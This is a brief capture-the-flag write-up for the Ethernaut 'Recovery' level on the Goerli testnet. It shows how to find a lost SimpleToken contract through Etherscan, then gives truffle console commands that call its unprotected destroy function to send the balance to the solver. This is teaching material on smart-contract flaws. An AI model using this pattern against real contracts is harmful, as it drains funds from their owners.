# Recovery

[Recovery](https://ethernaut.openzeppelin.com/level/0xb4B157C7c4b0921065Dded675dFe10759EecaA6D)

Given the Recovery contract address, we simply go to 
[Etherscan](https://goerli.etherscan.io/address/0x585f58a6e380487e67574a9b27f823eb86b14ec8) 
to identify the SimpleToken contract address. From there it is just a matter of connecting 
to SimpleToken and calling destroy, passing our address as the reciever for outsanding balance.

Recovery: <BR />
``0x585f58a6e380487e67574A9B27F823eB86b14EC8``

SimpleToken: <BR />
``0x9D8016110233433B5C097DAb14b5cAF8cc8Adaf5``

<BR />

# Live Attack

```BASH
truffle compile
truffle console --network goerli
```

```JS
sender = accounts[5]

token = await SimpleToken.at("0x9D8016110233433B5C097DAb14b5cAF8cc8Adaf5")
await token.destroy(sender)
```